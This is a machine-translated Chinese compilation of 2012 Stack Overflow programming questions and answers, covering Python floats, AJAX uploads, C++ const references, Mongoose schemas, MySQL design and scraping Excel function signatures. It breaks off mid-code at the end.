2.  我如何提取这些数据？使用 Javascript 还是其他东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:20:42.047

首先，我会跳过电子表格并使用数据库。它更灵活、更快。

其次，JavaScript 基本上无法从您的计算机中读取文件。您需要像 PHP 这样的服务器端技术来设置它并生成您需要的页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:22:59.820

这听起来有点宽泛的问题，但我会尝试解决一些问题：

```
2\. How do I pull that data? Use Javascript or something else? 
```

好吧，我不相信您可以直接从 javascript 中提取 excel 数据，因为如果能够直接使用 javascript 访问文件，那将是安全漏洞。但是，您可以使用 ajax 与可以为您读取 excel 文件的 php、asp 等进行通信，然后在后台将数据发送到您的 javascript，因此看起来 javascript 正在拉动它。

```
1\. Should I set each page to pull from the database? 
```

这取决于您希望页面如何工作。数据库驱动的页面可以更加动态，但如果您明确希望用户只能使用 excel 文件进行编辑，这可能是您并不真正想要/不需要的额外层。

如果它是一个非常基本的 excel 表格，主要是将其保留在网格中，您总是可以制作一个网页，其行为有点像 excel 表格的基本功能，用于用户输入汽车的品牌/型号/图片等......

# python - python中的浮点给出了错误的答案

> ID：10403434
> 
> 赞同：7
> 
> 时间：2012-05-01T19:53:55.453
> 
> 标签：python, python-3.x

我计算了以下内容：

```
>>> float(10.0-9.2)
0.800000000000000*7* 
```

即使做 10.0-9.2 也给出了上述结果。为什么额外的 7 会出现在结果中？

我在 python 3.2 上。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-01T19:55:00.340

浮点运算具有内置问题，因为它基于数字的二进制近似。

Python 文档中有[一个很好的解释。](http://docs.python.org/tutorial/floatingpoint.html)

如果您需要更准确的答案，可以查看[该`decimal`模块。](http://docs.python.org/library/decimal.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-02-07T07:59:12.707

您可以使用`round()`

例如：

```
print(round(10 - 9.2, 2)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T19:56:40.960

这是所有平台上二进制浮点运算的典型特征。如果您的应用程序不能容忍此误差范围内的舍入误差，您可以改用[Decimal](http://docs.python.org/library/decimal.html)对象。

# android - 无法在 Android/Gingerbread 上使用 Flexslider/SwipeJS 激活选择

> ID：10403439
> 
> 赞同：1
> 
> 时间：2012-05-01T19:54:15.920
> 
> 标签：android, select, mobile, android-2.3-gingerbread, flexslider

我最近完成了一个移动网站的构建，发现了一个似乎只发生在 Android Gingerbread 上的错误。

当在JS滑块（如FlexSlider或Swipejs）中的幻灯片上放置SELECT INPUTE时，您可以再也不能单击它或缩合并选择选项。

我想知道这是否与这两个滑块都使用的 display none/block 的使用有关 - 也许 Gingerbread 在这些情况下无法正确呈现选择？有趣的是，使用 SwipeJS 的第一张幻灯片是功能性的；其他人没有。

我在网上做了一些测试来证明：

[http://playground.iamkeir.com/slider-flexslider1-select](http://playground.iamkeir.com/slider-flexslider1-select)

[http://playground.iamkeir.com/slider-flexslider2-select](http://playground.iamkeir.com/slider-flexslider2-select)

[http://playground.iamkeir.com/slider-swipjs-select](http://playground.iamkeir.com/slider-swipjs-select)

作为参考，我在示例中使用了 Flexslider 2 Beta，尽管 Flexslider 1 也会出现同样的问题。

[https://github.com/woothemes/FlexSlider](https://github.com/woothemes/FlexSlider)

[https://github.com/woothemes/FlexSlider/tree/FlexSlider2](https://github.com/woothemes/FlexSlider/tree/FlexSlider2)

[http://swipejs.com/](http://swipejs.com/)

适用于 Android Icecream Sandwich、iPhone - 甚至黑莓。

我已经断断续续地摆弄了好几天了，我似乎无法缩小范围。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-03T08:52:50.923

所以我从创建 Flexslider 的小伙子 Tyler Smith 那里得到了一些建议：

“您是否尝试过禁用 translate3d 的使用？useCSS: false，看看错误是否仍然存在？ translate3d 是 swipe/flex 之间的共同点，有时会表现得很奇怪。”

他是对的——这确实修复了它，尽管它导致了 Flexslider 的另一个错误（更新：他最近修复了）。

所以要小心 translate3D - 和 Android < 4.x 中的 CSS 动画，请参见此处：[http ://daneden.me/2011/12/putting-up-with-androids-bullshit/](http://daneden.me/2011/12/putting-up-with-androids-bullshit/)

因此，为了解决这个问题，我将使用 useCSS: false 来定位 Android < 4.x。

请注意 useCSS 是 Fl​​exslider 2 Beta 中的一个属性，目前仍在测试和开发中，因此请谨慎使用。

**非常感谢泰勒！**

参考：

[http://playground.iamkeir.com/slider-flexslider2-select/](http://playground.iamkeir.com/slider-flexslider2-select/)

[https://github.com/woothemes/FlexSlider/tree/FlexSlider2](https://github.com/woothemes/FlexSlider/tree/FlexSlider2)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-03T10:29:25.493

如果该`useCSS: false`方法不起作用，我发现`-webkit-backface-visibility: hidden;`从 flexslider.css 文件中删除可以修复它。

这可能意味着`flip`过渡不会按预期进行。没有测试过。

# php - 如何在没有 Ajax 的情况下使用 JavaScript 发布到 PHP？

> ID：10403441
> 
> 赞同：0
> 
> 时间：2012-05-01T19:54:23.050
> 
> 标签：php, javascript, ajax, html

所以我有这个代码，用于通过 ajax 将文件上传到 PHP，但显然我的网络主机没有 ajax。没有ajax有什么办法可以做到吗？具体来说，我指的是在进度条部分之后的 UploadFile 函数（这似乎也不起作用......）

```
(function() {

// getElementById
function $id(id) {
    return document.getElementById(id);
}

// output information
function Output(msg) {
    var m = $id("messages");
    m.innerHTML = msg + m.innerHTML;
}

// file drag hover
function FileDragHover(e) {
    e.stopPropagation();
    e.preventDefault();
    e.target.className = (e.type == "dragover" ? "hover" : "");
}

// file selection
function FileSelectHandler(e) {

    // cancel event and hover styling
    FileDragHover(e);

    // fetch FileList object
    var files = e.target.files || e.dataTransfer.files;

    // process all File objects
    for (var i = 0, f; f = files[i]; i++) {
        ParseFile(f);
        UploadFile(f);
    }

}

//upload images
function UploadFile(file) {

    var xhr = new XMLHttpRequest();
    if ( xhr.upload && file.type == "image/jpeg" || file.type == "image/gif" || file.type == "image/jpg" || file.type == "image/png" && file.size <= $id("MAX_FILE_SIZE").value
) {

        //create progress bar
        var o = $id("progress");
        var progress = o.appendChild(document.createElement("p"));
        progress.appendChild(document.createTextNode("upload " + file.name));

        //progress bar
        xhr.upload.addEventListener("progress", function(e) {
            var pc = parseInt(100 - (e.loaded / e.total * 100));
            progress.style.backgroundPosition = pc + "% 0";
        }, true);

        //file received/failed
        xhr.onreadystatechange = function(e) {
            if (xhr.readyState == 4) {
                progress.className = (xhr.status == 200 ? "success" : "failure");
            }
        };

        //start upload
        xhr.open("POST", $is("upload").action, true);
        xhr.setRequestHeader("X_FILENAME", file.name);
        xhr.setRequestHeader("Content-type", file.type);
        xhr.send(file);

    }

}

// initialize
function Init() {

    var fileselect = $id("fileselect"),
        filedrag = $id("filedrag"),
        submitbutton = $id("submitbutton");

    // file select
    fileselect.addEventListener("change", FileSelectHandler, false);

    // is XHR2 available?
    var xhr = new XMLHttpRequest();
    if (xhr.upload) {

        // file drop
        filedrag.addEventListener("dragover", FileDragHover, false);
        filedrag.addEventListener("dragleave", FileDragHover, false);
        filedrag.addEventListener("drop", FileSelectHandler, false);
        filedrag.style.display = "block";

        // remove submit button
        submitbutton.style.display = "block";
    }

}

// output file information
function ParseFile(file) {

    Output(
        "<p>File information: <strong>" + file.name +
        "</strong> type: <strong>" + file.type +
        "</strong> size: <strong>" + file.size +
        "</strong> bytes</p>"
    );

    // display an image
    if (file.type.indexOf("image") == 0) {
        var reader = new FileReader();
        reader.onload = function(e) {
            Output(
                "<p><strong>" + file.name + ":</strong><br />" +
                '<img src="' + e.target.result + '" /></p>'
            );
        }
        reader.readAsDataURL(file);
        $("#fileselect").val(file);
    }

    // display text
    if (file.type.indexOf("text") == 0) {
        var reader = new FileReader();
        reader.onload = function(e) {
            Output(
                "<p><strong>" + file.name + ":</strong></p><pre>" +
                e.target.result.replace(/</g, "&lt;").replace(/>/g, "&gt;") +
                "</pre>"
            );
        }
        reader.readAsText(file);
    }

}

// call initialization file
if (window.File && window.FileList && window.FileReader) {
    Init();
}

})(); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-01T19:56:51.917

## 先说几件事...

* * *

> 我的虚拟主机没有 ajax

这没有多大意义。（*或**任何**准确的意义*）。

Ajax 只是您为了与服务器通信而实现的（在 Javascript 中）。（与访问服务器上的 php 脚本的方式相同；Ajax 使您能够在后台“获取”它，而无需重新加载页面或重定向到那里）。

因此，简而言之：它与服务器/主机本身无关。

**参考：** [http](http://en.wikipedia.org/wiki/Ajax_(programming) ://en.wikipedia.org/wiki/Ajax_(programming )

> 没有ajax有什么办法可以做到吗？

**阿贾克斯。**

* * *

## 例子 ：

* * *

*   [jQuery 阿贾克斯](http://api.jquery.com/jQuery.ajax/)
*   [终极 Ajax 对象](http://www.hunlock.com/blogs/The_Ultimate_Ajax_Object)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:06:11.163

只有现代浏览器（阅读：任何非 IE）支持 AJAX 上传的进度条。您还需要在 PHP 中以不同方式管理文件的上传，以使其正常工作。

例如：您需要使用`fopen("php://input", "r");`而不是`$_FILES`.

查看此 AJAX 文件上传器以获取更多信息：[https ://github.com/valums/file-uploader](https://github.com/valums/file-uploader)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-02T06:30:58.700

我会建议你，在这种情况下使用“Iframes”。我在 1-2 年前就这样做了，当时我们不想重新加载我们的页面以提交文件。

# java - Struts2：如何使用 $.post 将操作结果返回到同一 jsp 中的某个回调

> ID：10403442
> 
> 赞同：0
> 
> 时间：2012-05-01T19:54:26.800
> 
> 标签：java, jquery, struts2, callback

我使用 $.post 将函数从 getMinimizedFunction.jsp 发送到一些 struts2 动作，该动作调用一些 java 方法来计算最小化函数。如何在同一个 jsp getMinimizedFunction.jsp 中将最小化函数从操作返回到回调函数？

我的 getMinimizedFunction.jsp 中有以下代码：

```
 String function="A*B'+A*B";
              url='getMinFunction.action';
              pars={function:function};
             $.post(url,pars,someCallback);

function someCallback(data){
     do something with data;  //data =A (the minimized Function)
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T11:37:44.223

[您可以按照本教程](http://struts.apache.org/2.0.11.1/docs/ajax.html)中的说明返回流结果

```
<action name="getMinFunction" class="YourClass">
 <result type="stream">
    <param name="contentType">text/html</param>
    <param name="inputName">inputStream</param>
  </result>
</action> 
```

或者，您可以使用[struts2-jquery-plugin](http://www.weinfreund.de/struts2-jquery-showcase/index.action)，它使使用 ajax 变得更简单。

# java - 如何稳定 BasicEditField contentHeight？

> ID：10403445
> 
> 赞同：0
> 
> 时间：2012-05-01T19:54:36.617
> 
> 标签：java, user-interface, blackberry

我正在开发一个具有一些 BasicEditFields 的 GUI。

屏幕上有几个 Manager's、ButtonFieldss、LabelFields 等。

更改字段文本后，getContentHeight() 返回一个更大的值。（37个有一些文字，38个有其他文字）

我已指定填充和字体，但内容高度随文本字段而变化。

有什么方法可以让我的 BasicEditField 有一个固定大小，不会因文本内容而异？

注意 getPreferredHeight() 根据字体大小返回常量值 37。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T07:56:02.020

您可以通过子类化编辑字段和覆盖子布局来实现：

```
 protected void sublayout(int w, int h){
            super.sublayout(w, h);
            setExtent(w, yourFixedHeightHere);
        } 
```

我不确定是否`super`需要调用。

# ruby-on-rails - gmaps4rails1.5.0-应用程序不再渲染地图

> ID：10403446
> 
> 赞同：1
> 
> 时间：2012-05-01T19:54:39.107
> 
> 标签：ruby-on-rails, ruby-on-rails-3, google-maps, gmaps4rails

昨天应用程序功能齐全 [gmaps4rails 1.4.8]。今天部署的新版本现在应用程序不再渲染地图。请参阅有关原型导轨的通知。并对配置环境进行更改。但不确定如何安装原型导轨。也不知道在配置环境中需要什么 require 语句。需要改变什么才能恢复功能？希望尽快部署此应用程序。

注释掉 config.action_view.debug_rjs=true

错误

```
--> ActionController::RoutingError (No route matches "/gmaps4rails/gmaps4rails.base.js"):

--> Rendered c:/Ruby192/lib/ruby/gems/1.9.1/gems/actionpack-3.0.10/lib/action_dispatch/middleware/templates
/rescues/routing_error.erb within rescues/layout (1.0ms)
[2012-05-01 16:03:47] ERROR Errno::ECONNABORTED: An established connection was aborted by the software
in your host machine. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T22:59:25.770

v1.5.1 刚刚发布，应该修复了这个错误。抱歉，感谢您的报告！

# c++ - 编译器指出调用没有匹配的函数，即使原型中有一个

> ID：10403448
> 
> 赞同：1
> 
> 时间：2012-05-01T19:54:42.380
> 
> 标签：c++

我正在尝试实现二叉搜索树类，但编译器抛出错误。bstNode.h 文件在这里：

```
template <class Item, class Key>
class bstNode
{
public:
    bstNode();
    bstNode(const Item& init_data, const Key& init_key, bstNode<Item, Key> *init_left, bstNode<Item, Key> *init_right);
    ~bstNode();
    bstNode<Item, Key>* tree_copy(const bstNode<Item, Key>*& root);
private:
    Item data;
    Key key;
    bstNode* left;
    bstNode* right;
};

    template <class Item, class Key>
    //line 83 in the original code is below
bstNode<Item, Key>* bstNode<Item, Key>::tree_copy(const bstNode<Item, Key>*& root)
{
    bstNode<Item, Key>* l_ptr;
    bstNode<Item, Key>* r_ptr;
    if (root == NULL) return NULL;
    l_ptr = tree_copy(root -> left());
    r_ptr = tree_copy(root -> right());
    return new bstNode<Item, Key> (root -> data(), l_ptr, r_ptr);
} 
```

.h 文件可以使用空的 main 函数正常编译，但是当我使用 bstNode.cxx 中的以下代码尝试它时，它会崩溃，并给出错误。代码是：

```
 #include <cstddef>
#include <algorithm>
#include <math.h>
#include <iostream>
#include "bstNode.h"

using namespace std;

int main()
{
    bstNode<int, size_t>* root_ptr = NULL;
    bstNode<int, size_t>* copy_root_ptr = root_ptr -> tree_copy(root_ptr);
    return 0;
} 
```

错误是：

```
bstNode.cxx: In function ‘int main()’:
bstNode.cxx:14: error: no matching function for call to ‘bstNode<int, long unsigned int>::tree_copy(bstNode<int, long unsigned int>*&)’
bstNode.h:83: note: candidates are: bstNode<Item, Key>* bstNode<Item, Key>::tree_copy(const bstNode<Item, Key>*&) [with Item = int, Key = long unsigned int] 
```

原型与函数的实现完全相同，没有 bstNode:: 所以我不确定发生了什么。我正在使用 g++ 编译器。有任何想法吗？非常感谢，谢谢。

编辑：我减少了代码以尝试突出问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T20:05:00.373

原型并不完全相同，因为存在质量`const`差异。声明是

```
 bstNode<Item, Key>* tree_copy(const bstNode<Item, Key>*& root); 
```

（引用 const 指针）而您将其称为

```
 bstNode<int, size_t>* root_ptr;
 tree_copy(root_ptr); 
```

所以它得到了对*非常量*指针的引用。虽然你可以将 a 传递`foo *`给需要 a 的东西，`const foo *`但你不能通过`foo *`引用来传递 a 到需要 a 的东西`const foo * &`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-01T20:05:45.420

编译器（在大多数情况下）拒绝代码是正确的。问题是没有从`T*&`to的转换`const T*&`，所以不能使用现有的函数。

**为什么这种转换不存在？**

不存在该转换的原因是它会破坏 const 正确性。考虑这个例子：

```
const int k = 10;
void f( const int*& kp ) {
   kp = &k;                 // Fine, the pointer promises not to change the object
}
int main() {
   int *p; 
   f( p );                 // Does not compile, but assume it would
                           // after the call, p points to k
   *p = 20;                // Modifying a constant!!!!
                           //    p never promised not to change the pointee
} 
```

现在，一个可能的解决方案是，因为您不需要修改传递给函数的指针，所以`const`在签名中添加更多 s：

```
bstNode<Item, Key>* tree_copy(const bstNode<Item, Key>* const & root); 
```

这样做会阻止代码更改指针，这是上面示例中的问题。但是，如果你真的想一想，

*为什么首先要传递对指针的引用？*

指针复制起来很便宜，因此传递它们`const&`没有多大意义，而且由于您不需要函数来更改要传递的指针，因此按值传递既正确*又*可能更有效。

# mongodb - 如何在 Mongoose 文档中允许自由格式的 JSON 数据？

> ID：10403450
> 
> 赞同：3
> 
> 时间：2012-05-01T19:54:50.270
> 
> 标签：mongodb, mongoose

我正在使用[Mongoose ODM](http://mongoosejs.com/docs/model-definition.html)在将模型存储到 MongoDB 之前对其进行部分验证。

是否可以放宽 Mongoose 模式以便不验证文档的给定部分？我尝试了以下方法：

```
var MySchema = new Schema({
    user_id: { type: Schema.ObjectId, ref: 'User' },
    freeform_data: {},
}); 
```

例如，如果我将内容设置为：

```
{
   user_id: '123456',
   freeform_data: {
      dataitem1: 'a',
      dataitem2: 'b',
      items: [ 1, 2, 3, 4 ]
   }
} 
```

然后只`user_id`存储，这在安全方面非常有意义。

如何禁用 mongoose 对此字段的验证？

我将此应用程序仅用于原型制作目的，所以我现在不关心安全性（我只想制作原型）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-02T02:00:42.440

当您修改[`Mixed`](http://mongoosejs.com/docs/schematypes.html#mixed)诸如 freeform_data 之类的字段的内容时，您需要通知 Mongoose 您已通过调用`markModified(path)`修改后的文档来更改其值，否则后续`save()`调用将不会保存它。

例如：

```
user.freeform_data = { foo: 'bar' };
user.markModified('freeform_data');
user.save(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-05T03:05:25.513

**Mongeese** ：猫鼬多数据库助手/黑客模块 [https://github.com/donpark/mongeese](https://github.com/donpark/mongeese)

免责声明：我希望在同一个应用程序中连接到两个 MongoDB 实例并放弃了。所以我没有尝试过。

# mysql - MySQL 性能设计 - 许多表和数据库或一个数据库中的 2 个大表

> ID：10403453
> 
> 赞同：1
> 
> 时间：2012-05-01T19:54:59.660
> 
> 标签：mysql

我意识到这种类型的问题之前已经被问过好几次了，但是由于有很多不同的答案，我想找出最适合我的情况的答案。

我正在为心理学家设计一个在线期刊。我计划在主数据库中有一个表来存储所有用户（心理学家）信息，然后我不确定如何处理用户想要输入的患者数据（笔记）。我是不是该：

1.  在存储所有用户患者及其笔记的同一数据库中有 1 个表。
2.  为每个用户创建一个单独的表格，并将他们的所有患者放在该表格上。
3.  为每个用户提供一个单独的数据库，并为该数据库中的每个患者提供一个表格。

就数据大小而言，我假设每个患者大约有 1000 个总用户，每个用户有 300-400 名患者，平均有 100 个笔记（这是几段数据，每个笔记是整个咨询会议的内容）。

[我在 SO DB 设计](https://stackoverflow.com/questions/3245496/db-design-one-large-db-for-all-customers-or-many-small-dbs)上看到了这个问题：一个面向所有客户的大型数据库或许多小型数据库，我只是不确定它是否也适用于我的情况。我还看到了各种关于使用 InnoDB 分区的参考资料，以便将所有患者和笔记放在一张表上。如果建议这样做，您是否还可以包括一些资源或教程，因为我在这方面找到的信息是有限的，而且对我来说有点太复杂了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:37:58.030

对于这样一个相对较小的数据集，您不需要像 InnoDB 分区这样的东西。我建议使用四个 InnoDB 表：

```
1) psychologists: id (auto-increment, primary key), name, address, ...
2) patients: id (auto-increment, primary key), name, address ...
3) psych-patients: id (auto-increment, primary key), psychologist-id (foreign key reference to `psyschologists`.`id`, patient-id (foreign key reference to `patients`.`id), with a unique constraint spanning the columns `psychologist-i` and `patient-id`
4) notes: patient-id, psychologist-id, date, text 
```

这使您可以干净地分离数据。第三张表是必需的，以便患者可以更换医生；如果您包含`psychologist-id`在表中`patients`，则必须为此创建一条新记录。（您将无法简单地更新 ID，因为之前笔记的链接会丢失。）

当然，您正在处理医疗数据，因此您需要尽一切可能确保这些私人笔记的安全。然而，这是您应该在应用程序层而不是数据库层处理的事情。为每位心理学家使用不同的数据库似乎是一种更安全的解决方案，但可能并非如此，此外，您的软件很难让患者在做笔记的同时更换心理学家。

# python - 比较字符串中的前几个字符

> ID：10403466
> 
> 赞同：3
> 
> 时间：2012-05-01T19:55:22.717
> 
> 标签：python, string, compare

所以我有一个字符串列表：

```
list1 = ["1thing", "2thing", "3thing", "1thing"] 
```

我想知道每个人在列表中出现了多少次。问题是，我只想比较前几个字符，因为我知道如果第一个，比如 3 个字符相同，那么整个字符串是相同的。我在想我可以修改内置的 list.count(x) 方法，或者我可以覆盖`__eq__`运算符，但我不确定如何执行其中任何一个。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-01T19:57:58.323

使用生成器提取前几个字符，并在其`collections.Counter`上使用内置类：

```
Counter(item[:2] for item in list1) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-01T19:57:05.203

为什么要经历所有的麻烦......使用`collections.Counter`模块来查找频率。

```
>>> import collections
>>> x=['1thing', '2thing', '1thing', '3thing']
>>> y=collections.Counter(x)
>>> y
Counter({'1thing': 2, '2thing': 1, '3thing': 1}) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T20:53:04.270

可能不如@Marcin 的解决方案好，但使用`itertools.groupby`它可能会使其更具可读性和灵活性。

```
from itertools import groupby

def group_by_startswith(it, n):
    """Get a dict mapping the first n characters to the number of matches."""

    def first_n(str_):
        return str_[:n]

    startswith_sorted = sorted(it, key=first_n)
    groups = groupby(startswith_sorted, key=first_n)

    return {key: len(list(grouped)) for key, grouped in groups} 
```

示例输出：

```
>>> list1 = ["1thing", "2thing", "3thing", "1thing"]
>>> print(group_by_startswith(list1, 3))
{'3th': 1, '2th': 1, '1th': 2} 
```

此解决方案使您对结果有更多的灵活性。例如，修改返回行以返回`grouped`或`list(grouped)`允许您轻松获取匹配的对象。

# javascript - 为什么 google plus 似乎使用 ajax 加载页面内容但 url 发生变化？

> ID：10403470
> 
> 赞同：2
> 
> 时间：2012-05-01T19:55:53.200
> 
> 标签：javascript, ajax

通常，当一个页面被加载时（当 url 改变时），第一个请求是文档，但是当我在 gplus 中单击链接时没有看到文档请求，并且地址栏中的 url 肯定改变了！如您在下图。

前几个请求是针对脚本的，其他请求都是图像。我很困惑，如果他们使用脚本加载内容，为什么 url 会改变？如果他们改变了位置，为什么没有页面请求，并且在重定向到另一个页面时动画看起来很流畅。

![在此处输入图像描述](../Images/ce4c115cf02d4d82ac0c24ddeb6fd0e0.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:02:54.157

因为他们正在使用[pushState](https://developer.mozilla.org/en/DOM/Manipulating_the_browser_history#Adding_and_modifying_history_entries) ;) 它允许您*通过*JavaScript 在历史记录中添加一些 URL（当然，对于同一个域）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T20:03:55.617

首先，您只是错过了（我不知道如何）请求，因为它们在那里；）例如，只需使用 chrome 开发工具，您就会看到它们。

使用 HTML 5，您可以操纵浏览器历史记录并实际更改 URL：[https ://developer.mozilla.org/en/DOM/Manipulating_the_browser_history](https://developer.mozilla.org/en/DOM/Manipulating_the_browser_history)

# r - 根据数据框的行创建列

> ID：10403471
> 
> 赞同：4
> 
> 时间：2012-05-01T19:55:54.543
> 
> 标签：r

我有一个数据框。我正在尝试创建一个虚拟变量，该变量是给定行的最大 3 列。

```
for(i in 1:nrow(data))
{
  data[i,]$max_metric <- max(data[i,]$a,
                             data[i,]$b,
                             data[i,]$c)
} 
```

此代码有效，但绝对不是最好的方法。还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T19:59:18.337

Use `pmax`，它采用传递给它的所有参数的元素最大值。但是，这意味着您不能只传递整个 data.frame。

```
# this won't work because data[,c("a","b","c")] is one argument
data$max_metric <- pmax(data[,c("a","b","c")]) 
```

但是您可以将 data.frame 的每一列传递给`pmax`via，`do.call`因为 to 的第二个参数`do.call`应该是一个列表，而 data.frames 是列表（带有一些属性）。

```
data$max_metric <- do.call(pmax, data[,c("a","b","c")])
# if you want na.rm=TRUE
data$max_metric <- do.call(pmax, c(data[,c("a","b","c")],list(na.rm=TRUE))) 
```

# c# - Excel 公式和元数据

> ID：10403475
> 
> 赞同：2
> 
> 时间：2012-05-01T19:56:11.073
> 
> 标签：c#, excel, vba

有什么方法可以提取各种excel公式的底层元数据。我正在使用 excel 公式在 C# 中构建这个框架，并且有兴趣了解每个公式的输入参数、它们的数据类型和返回类型。这将帮助我根据所提供的元数据构建一个向导屏幕。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T09:30:24.497

基于@ja72 的建议，很容易从他提到的链接中解析数据。我不太擅长 C#，所以这里有一个 vb.net 代码，您可以将其转换为 C#

话虽如此，您可以通过多种方式从 C# 中查看此问题

**方式 1**

在运行时导航到 URL 并使用以下代码解析值。

***缺点***：

1）您必须有互联网连接

2）这个过程很慢

**方式 2**

创建一个单独的程序以导航到 URL 并使用以下代码解析值。使用以下代码生成文本文件或 csv 文件的输出并将文件嵌入到您的资源中，以便您可以随时使用它

我会建议方式**2**，但最终决定权在你。:)

**代码**

```
Public Class Form1
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        TextBox1.Clear()
        GetFormulas()
        MessageBox.Show ("Done!")
    End Sub

    Sub GetFormulas()
        Dim wc As New Net.WebClient
        '~~> first get links
        Dim mainPage As String = wc.DownloadString("http://office.microsoft.com/client/helppreview.aspx?AssetId=HV805551279990&lcid=1033&NS=EXCEL.DEV&Version=12&pid=CH080555125")
        Dim doc As mshtml.IHTMLDocument2 = New mshtml.HTMLDocument
        doc.write (mainPage)
        doc.close()
        Dim table As mshtml.IHTMLElement = DirectCast(doc.getElementById("vstable"), mshtml.IHTMLElement2).getElementsByTagName("table")(0)
        Dim links As mshtml.IHTMLElementCollection = table.getElementsByTagName("A")
        For Each link In links
            Dim childPage As String = wc.DownloadString(link.getAttribute("href"))
            Dim doc2 As mshtml.IHTMLDocument2 = New mshtml.HTMLDocument
            doc2.write (childPage)
            doc2.close()
            Dim div2 As mshtml.IHTMLElement2 = doc2.getElementById("m_article")
            For Each elem As mshtml.IHTMLElement In div2.getElementsByTagName("P")
                If elem.getAttribute("className") = "signature" Then
                    Dim formulaString As String = elem.innerText
                    TextBox1.AppendText (link.innerText & vbTab & formulaString & vbCrLf)
                End If
            Next
        Next
    End Sub
End Class 
```

**快照**

![在此处输入图像描述](../Images/aa3a2aa3d84f1856fae4f1ac33e233e2.png)

**注意**：以上只是如何抓取 ja72 提供的上述链接的示例。如果您打算使用任何其他链接，则必须相应地更改代码。另请注意，上述链接中提到的公式适用于 Excel 2007 及更高版本。对于 Excel 2003，您将不得不进入另一个链接。我没有`STOP`在上面的例子中包含一个按钮，所以一旦程序开始运行，它就无法停止，直到它完成。我相信您可以再添加一个按钮来终止提取。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-02T10:54:50.003

所有功劳归功于@SiddharthRout。这是 Sid 发布的代码的 C# 转换

使用 C# 时，您确实必须处理大量的转换和转换。但这就是 C# 的工作方式：P

```
using System;
using System.Windows.Forms;

Namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        Public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            GetFormulas();
            MessageBox.Show("Done!");
        }

        public void GetFormulas()
        {
            mshtml.HTMLDocument doc = NewHtmlDoc("http://office.microsoft.com/client/helppreview.aspx?AssetId=HV805551279990&lcid=1033&NS=EXCEL.DEV&Version=12&pid=CH080555125");
            mshtml.IHTMLElement2 table = (mshtml.IHTMLElement2)(mshtml.IHTMLElement2)((mshtml.IHTMLElement2)doc.getElementById("vstable")).getElementsByTagName("table").item(null, 0);
            mshtml.IHTMLElementCollection links = table.getElementsByTagName("A");
            foreach (mshtml.IHTMLElement link in links)
            {
                mshtml.HTMLDocument doc2 = NewHtmlDoc(link.getAttribute("href",0).ToString());
                mshtml.IHTMLElement div2 = doc2.getElementById("m_article");
                foreach (mshtml.IHTMLElement elem in ((mshtml.IHTMLElement2)div2).getElementsByTagName("P"))
                {
                    if (elem.getAttribute("className",0) != null && elem.getAttribute("className",0).ToString() == "signature")
                    {
                        string formulaString = elem.innerText;
                        textBox1.AppendText(link.innerText + "\t\t" + formulaString + "\n");
                    }
                }
            }
        }

        private mshtml.HTMLDocument NewHtmlDoc(string url)
        {
            System.Net.WebClient wc = new System.Net.WebClient();
            string page = wc.DownloadString(url);
            mshtml.IHTMLDocument2 doc = (mshtml.IHTMLDocument2)(new mshtml.HTMLDocument());
            doc.write(page);
            doc.close();
            return (mshtml.HTMLDocument)doc;
        }

    }
} 
```

# java - Java - 使用 2 个迭代器和可怕的 ConcurrentModificationException 解析 ArrayList

> ID：10403476
> 
> 赞同：0
> 
> 时间：2012-05-01T19:56:14.673
> 
> 标签：java, iterator

我正在搜索 ArrayList 并与 2 个迭代器进行比较。我正在将值写入最终将成为 XML 输出的字符串缓冲区。当我解析值时，我正在检查匹配的 itemId。匹配通常是零件和图纸。一个零件可以有许多图纸。对于我的 XML，我必须知道所有匹配项的类型和名称，并将这些值附加在一起。

使用这个 ArrayList：

itemId 类型名称

1000 份锤子
1001 份钉子
1000 dwg 语义
1002 份尺子

我的示例 XML 输出大致如下所示：

```
<Master itemId=1000 type=part name=hammer>
  <Extra type=dwg name=semantic>
</Master>
<Master itemId=1001 type=part name=nail>
</Master>
<Master itemId=1002 type=part name=ruler>
</Master> 
```

这是我的第一个循环

```
while (theBaseInterator.hasNext()){
     ImportedTableObjects next = theBaseInterator.next(); 
     currentEntry = next.identiferId;
     currentType = next.typeId;
     currentDatasetName = next.nameId;
     compareInterator = tArray.listIterator(theBaseInterator.nextIndex());
     compareEntriesofArray(currentEntry, currentType, currentDatasetName, compareInterator); <======= calling method for 2nd loop and compare check
  } 
```

我为第二个循环编写了一个方法并进行了比较

```
private void compareEntriesofArray(Object currentEntry, Object currentType, Object currentDatasetName, ListIterator<ImportedTableObjects> compareInterator)
object nextEntry;   
while (compareInterator.hasNext()) {
